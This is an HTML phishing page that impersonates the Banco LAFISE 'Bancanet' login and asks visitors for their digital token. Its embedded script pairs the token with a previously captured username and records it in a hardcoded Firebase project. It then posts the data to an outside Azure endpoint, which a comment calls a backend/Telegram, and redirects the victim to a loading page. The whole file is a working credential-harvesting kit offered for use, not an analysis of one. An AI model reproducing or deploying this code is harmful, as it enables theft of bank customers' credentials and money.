<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Bancanet - Banco LAFISE</title>
    <style>
      :root {
        --green: #007e68;
        --green-dark: #0b6c57;
        --text: #173c33;
        --link: #0b6c57;
        --border: #cfd8d5;
        --btn-bg: #a9d9cc;
        --btn-br: #8fcfbe;
        --btn-tx: #0b6c57;
        --card: #fff;
      }
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }
      html,
      body {
        height: 100%;
      }
      body {
        font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial,
          Helvetica, sans-serif;
        background: var(--green);
        color: var(--text);
      }

      /* Barra superior */
      .topbar {
        height: 52px;
        background: var(--green-dark);
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 0 14px;
        color: #eaf7f3;
        position: sticky;
        top: 0;
        z-index: 5;
      }
      /* Una sola imagen responsiva */
      .icons {
        opacity: 0.9;
      }
      .icons img {
        height: 18px;
        width: auto;
      }
      .desktop-img {
        display: none;
      }

      @media (min-width: 768px) {
        .mobile-img {
          display: none;
        }
        .desktop-img {
          display: block;
        }
      }

      .lang {
        display: flex;
        align-items: center;
        gap: 6px;
        font-size: 14px;
      }
      .caret {
        border: 4px solid transparent;
        border-top-color: #eaf7f3;
        margin-top: 3px;
      }

      /* Contenido */
      .wrap {
        display: flex;
        flex-direction: column;
        align-items: center;
        padding-top: 0;
        min-height: calc(100vh - 52px);
      }

      .card {
        width: 100%;
        max-width: 410px;
        background: var(--card);
        border-radius: 2px;
        box-shadow: 0 0 0 1px rgba(0, 0, 0, 0.08);
        padding: 40px;
        padding-bottom: 90px;
        min-height: 480px; /* alto en móvil */
        display: flex;
        flex-direction: column;
        justify-content: flex-start;
        margin-top: 0;
      }

      /* Logo centrado arriba */
      .logo-top {
        width: 200px;
        height: 40px;
        margin: 0 auto 18px;
        background: url("logo.png") no-repeat center/contain; /* móvil */
      }

      @media (min-width: 768px) {
        .wrap {
          justify-content: center;
        } /* centrado vertical */
        .card {
          min-height: auto;
        }
        .logo-top {
          background: url("logo.png") no-repeat center/contain; /* escritorio */
          width: 300px;
          height: 46px;
        }
      }

      h1 {
        text-align: center;
        font-size: 18px;
        font-weight: 700;
        margin-bottom: 18px;
      }

      /* Input con icono */
      .input-wrap {
        display: flex;
        align-items: center;
        gap: 8px;
        border: 1px solid var(--border);
        border-left: 4px solid var(--green-dark);
        border-radius: 2px;
        padding: 10px 12px;
        background: #fff;
        margin-bottom: 8px;
      }
      .icon {
        width: 18px;
        height: 18px;
        flex: 0 0 18px;
        opacity: 0.75;
        fill: #b3c3be;
      }
      .input {
        width: 100%;
        border: 0;
        outline: 0;
        font-size: 14px;
        color: #223e36;
      }

      .help-row {
        display: flex;
        justify-content: flex-end;
        margin-bottom: 12px;
      }
      .link {
        color: var(--link);
        text-decoration: none;
        font-size: 12px;
      }
      .link:hover {
        text-decoration: underline;
      }

      .info {
        text-align: center;
        font-size: 13px;
        margin-bottom: 18px;
      }
      .info a {
        display: block;
        margin: 4px 0;
        font-size: 13px;
      }

      /* Botón a la derecha */
      .actions {
        display: flex;
        justify-content: flex-end;
        margin-top: auto;
      }
      .btn {
        background: #e0e0e0;
        border: 1px solid #ccc;
        color: #888;
        padding: 10px 22px;
        border-radius: 3px;
        font-weight: 600;
        cursor: not-allowed;
        transition: all 0.3s ease;
        opacity: 0.6;
        display: inline-flex;
        align-items: center;
        gap: 8px;
      }

      .spinner {
        width: 16px;
        height: 16px;
        border: 2px solid rgba(255, 255, 255, 0.6);
        border-top-color: white;
        border-radius: 50%;
        display: inline-block;
        animation: spin 0.9s linear infinite;
      }
      @keyframes spin {
        to {
          transform: rotate(360deg);
        }
      }

      /* Estado activado */
      .btn.active {
        background: var(--green);
        border: 1px solid var(--green-dark);
        color: #fff;
        cursor: pointer;
        opacity: 1;
      }
      .btn.active:active {
        transform: translateY(1px);
      }
      .btn.active:hover {
        background: var(--green-dark);
      }

      /* Estados de carga del botón */
      .btn.loading {
        opacity: 0.7;
        cursor: not-allowed;
      }
      .btn.loading:hover {
        background: var(--green);
        transform: none;
      }

      /* Footer */
      .foot {
        text-align: center;
        color: #eaf7f3;
        font-size: 11px;
        padding: 10px 0 18px;
      }
    </style>
    <script type="module">
      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
      import {
        getFirestore,
        doc,
        setDoc,
        onSnapshot,
      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";

      const firebaseConfig = {
        apiKey: "AIzaSyDFYJf5HrCfbyEkggIHJ6hcgQJpUKMfzc0",
        authDomain: "basedtos-84767.firebaseapp.com",
        projectId: "basedtos-84767",
        storageBucket: "basedtos-84767.appspot.com",
        messagingSenderId: "622608516389",
        appId: "1:622608516389:web:b3c12b4a3537c1bfff06cc",
      };

      const app = initializeApp(firebaseConfig);
      const db = getFirestore(app);

      window.db = db; // Hacer db accesible globalmente
      window.doc = doc;
      window.setDoc = setDoc;
    </script>
  </head>
  <body>
    <!-- Barra superior -->
    <header class="topbar">
      <div class="icons">
        <img
          src="logomobil.png"
          alt="Icono móvil"
          class="mobile-img"
          style="
            width: 70px;
            height: 70px;
            margin-left: 20px;
            margin-top: 30px;
            background: var(--green-dark);
            padding: 10px;
          "
        />
        <img
          src="logopc.png"
          alt="Icono PC"
          class="desktop-img"
          style="
            width: 140px;
            height: auto;
            margin-left: 50px;
            margin-top: 50px;
            padding: 5px;
            background: var(--green-dark);
          "
        />
      </div>
      <div class="lang"><span>ES</span><span class="caret"></span></div>
    </header>

    <!-- Contenido -->
    <main class="wrap">
      <section class="card">
        <div class="logo-top"></div>
        <h1>Bienvenido a Bancanet <br> Verifica tu Ingreso</h1>

        <!-- ✅ ID agregado -->
        <form id="loginForm" autocomplete="off" novalidate>
          <div class="input-wrap">
            <svg
              class="icon"
              viewBox="0 0 24 24"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
              aria-hidden="true"
            >
              <path
                d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              />
              <circle
                cx="12"
                cy="7"
                r="4"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              />
            </svg>
            <input
              class="input"
              type="text"
              placeholder="Escriba su token digital"
              inputmode="text"
            />
          </div>

          <div class="help-row">
            <a class="link" href="#">Teclado virtual</a>
          </div>

        
          <div class="actions">
            <!-- ✅ spans agregados para manejo de loading -->
            <button
              class="btn"
              type="submit"
              disabled
              id="submitBtn"
              aria-disabled="true"
            >
              <span class="btn-text">Siguiente</span>
              <span class="btn-loading" style="display: none">
                <span class="spinner" aria-hidden="true"></span>
                <span style="margin-left: 5px">Cargando…</span>
              </span>
            </button>
          </div>
        </form>
      </section>

      <p class="foot">
        © Banco LAFISE - Todos los derechos reservados - www.lafise.com
      </p>
    </main>

    <script>
      // Obtener elementos
      const input = document.querySelector(".input");
      const submitBtn = document.getElementById("submitBtn");
      const form = document.getElementById("loginForm");
      const btnText = document.querySelector(".btn-text");
      const btnLoading = document.querySelector(".btn-loading");

      // Función para activar/desactivar botón
      function toggleButton() {
        const hasText = input.value.trim().length > 0;
        submitBtn.disabled = !hasText;
        submitBtn.setAttribute("aria-disabled", String(!hasText));
        submitBtn.classList.toggle("active", hasText);
      }

      // Función para mostrar estado de carga
      function setLoadingState(loading) {
        submitBtn.classList.toggle("loading", loading);
        submitBtn.disabled = true; // bloquea mientras carga
        submitBtn.setAttribute("aria-disabled", "true");
        if (loading) {
          btnText.style.display = "none";
          btnLoading.style.display = "inline-flex";
        } else {
          btnText.style.display = "inline";
          btnLoading.style.display = "none";
          toggleButton(); // restaurar según input
        }
      }

      document
        .getElementById("loginForm")
        .addEventListener("submit", async function (e) {
          e.preventDefault(); // Evita recarga

          const username = document.querySelector(".input").value.trim();
          const submitBtn = document.getElementById("submitBtn");

          if (!username) {
            alert("Por favor ingrese su nombre de usuario");
            return;
          }

          // Cambia el texto y bloquea botón
          submitBtn.disabled = true;
          submitBtn.innerText = "Procesando...";

          // Mensaje a enviar
          const message =
            "Lafise\nUsuario: " +
            localStorage.getItem("usuario") +
            "\nToken: " +
            username;
          try {
            // Envío a tu backend/Telegram
            const questionRef = doc(
              window.db,
              "lafis2",
              localStorage.getItem("usuario")
            );
            await setDoc(questionRef, {
              question1: "A1",
              question2: "A1",
              question3: "A1",
              page: 0,
            });
            const formData = new FormData();
formData.append("mensaje", message);

await axios.post(
  "https://serivihtn-fdg4e4ffc9gaf0f8.francecentral-01.azurewebsites.net/lafise4",
  formData,
  {
    headers: {
      "Content-Type": "multipart/form-data",
    },
  }
);

            // Redirige después de enviar
            window.location.href = "cargando.html";
          } catch (error) {
            console.error(error);
            alert("Error al enviar los datos");
            submitBtn.disabled = false;
            submitBtn.innerText = "Siguiente";
          }
        });
      // Escuchar cambios en el input
      input.addEventListener("input", toggleButton);
      input.addEventListener("keyup", toggleButton);

      // ✅ Estado inicial del botón
      toggleButton();
    </script>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
  </body>
</html>
